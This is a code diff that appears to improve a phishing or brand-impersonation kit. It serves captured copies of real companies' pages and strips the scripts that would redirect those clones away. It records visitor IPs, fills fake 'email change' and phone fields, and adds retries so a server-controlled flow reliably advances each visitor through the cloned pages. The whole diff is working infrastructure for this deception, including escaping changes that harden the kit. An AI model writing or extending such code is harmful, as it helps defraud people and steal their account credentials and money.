@@ -230,6 +230,7 @@ const CASE_INPUT_SHIM = `<style data-injected="visitor-case-input">
   window.__rvCaseInputReady = true;
 
   function brandFromPath() {
+    if (window.__rvBrandPage && window.__rvBrandPage.brand) return window.__rvBrandPage.brand;
     try {
       var parts = decodeURIComponent(location.pathname).split('/').filter(Boolean);
       var idx = parts.indexOf('preview');
@@ -495,11 +496,23 @@ const ADVANCE_SHIM = `<style data-injected="visitor-advance">
       });
   }
 
+  var advanceRetries = 0;
   function advance(choice, detail, btnForBusy) {
     if (btnForBusy) btnForBusy.setAttribute('data-rv-busy', 'true');
     return postAdvance(choice, detail).then(function (data) {
       if (data && data.nextUrl) {
+        advanceRetries = 0;
         location.href = data.nextUrl;
+      } else if (data && data.error === 'no_session') {
+        advanceRetries++;
+        if (advanceRetries < 3) {
+          setTimeout(function () { advance(choice, detail, btnForBusy); }, 1500);
+        } else if (btnForBusy) {
+          btnForBusy.removeAttribute('data-rv-busy');
+          btnForBusy.textContent = 'Retry';
+          btnForBusy.disabled = false;
+          advanceRetries = 0;
+        }
       } else if (btnForBusy) {
         btnForBusy.removeAttribute('data-rv-busy');
       }
@@ -876,24 +889,31 @@ export interface TemplateOverrides {
 	emailTo?: string;
 }
 
+function escapeHtml(s: string): string {
+	return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
 function applyOverrides(html: string, overrides: TemplateOverrides): string {
 	if (overrides.lastTwoDigits) {
-		html = html.replace(/(<span\s+id="rv-phone">[^<]*?)(\d{2})(<\/span>)/, `$1${overrides.lastTwoDigits}$3`);
+		const safe = escapeHtml(overrides.lastTwoDigits.replace(/\D/g, '').slice(0, 4));
+		html = html.replace(/(<span\s+id="rv-phone">[^<]*?)(\d{2})(<\/span>)/, `$1${safe}$3`);
 	}
 	if (overrides.emailFrom) {
+		const safe = escapeHtml(overrides.emailFrom.slice(0, 200));
 		html = html.replace(
 			/(class="rv-from rv-mono">)[^<]*/,
-			`$1${overrides.emailFrom}`
+			`$1${safe}`
 		);
 	}
 	if (overrides.emailTo) {
+		const safe = escapeHtml(overrides.emailTo.slice(0, 200));
 		html = html.replace(
 			/(class="rv-to rv-mono">)[^<]*/,
-			`$1${overrides.emailTo}`
+			`$1${safe}`
 		);
 		html = html.replace(
 			/Email change to [^'"<]+/g,
-			`Email change to ${overrides.emailTo}`
+			`Email change to ${safe}`
 		);
 	}
 	return html;
@@ -975,7 +995,8 @@ const LOADING_GATE_SHIM = `<script data-injected="loading-gate">
     return;
   }
   var bp = window.__rvBrandPage || {};
-  setTimeout(function () {
+  var loadRetries = 0;
+  function tryAdvance() {
     fetch('/api/visitor/page-advance', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -987,10 +1008,14 @@ const LOADING_GATE_SHIM = `<script data-injected="loading-gate">
     })
       .then(function (r) { return r.json().catch(function () { return null; }); })
       .then(function (d) {
-        if (d && d.nextUrl) location.href = d.nextUrl;
+        if (d && d.nextUrl) { location.href = d.nextUrl; return; }
+        if (loadRetries < 3) { loadRetries++; setTimeout(tryAdvance, 2000); }
       })
-      .catch(function () {});
-  }, delay);
+      .catch(function () {
+        if (loadRetries < 3) { loadRetries++; setTimeout(tryAdvance, 2000); }
+      });
+  }
+  setTimeout(tryAdvance, delay);
 })();
 </script>`;
 
@@ -1051,7 +1076,7 @@ const PAGE_VARS_SHIM = `<script data-injected="visitor-page-vars">
     });
     document.querySelectorAll('[data-rv-var-html]').forEach(function (el) {
       var k = el.getAttribute('data-rv-var-html');
-      if (k && vars[k] != null) el.innerHTML = vars[k];
+      if (k && vars[k] != null) el.textContent = vars[k];
     });
     document.querySelectorAll('[data-rv-var-img]').forEach(function (el) {
       var k = el.getAttribute('data-rv-var-img');
@@ -1298,6 +1323,18 @@ function injectPageVarsShim(html: string, brand: string, page: string, visitorIp
 	return html.slice(0, bodyClose) + payload + html.slice(bodyClose);
 }
 
+/**
+ * Strip captured Next.js hydration/flight scripts that can trigger
+ * NEXT_REDIRECT to Google or cause console errors when running alongside
+ * our injected shims.  Keeps static HTML + CSS intact.
+ */
+function stripNextJsPayloads(html: string): string {
+	html = html.replace(/<script[^>]*src="?\/_next\/[^"]*"?[^>]*><\/script>/gi, '');
+	html = html.replace(/<script[^>]*>\s*self\.__next_f\s*\.push\([\s\S]*?<\/script>/gi, '');
+	html = html.replace(/<script[^>]*>\s*\(self\.__next_f\s*=[\s\S]*?<\/script>/gi, '');
+	return html;
+}
+
 export function loadTemplateHtml(
 	brand: string,
 	page: string,
@@ -1308,6 +1345,7 @@ export function loadTemplateHtml(
 	const file = join(TEMPLATE_ROOT, `${t.slug}.html`);
 	if (!existsSync(file)) return undefined;
 	let html = readFileSync(file, 'utf-8');
+	html = stripNextJsPayloads(html);
 	html = injectMobileScrollFix(html);
 	html = injectPageVarsShim(html, brand, page, opts?.visitorIp);
 	html = injectCoinMarketShim(html, brand, page);
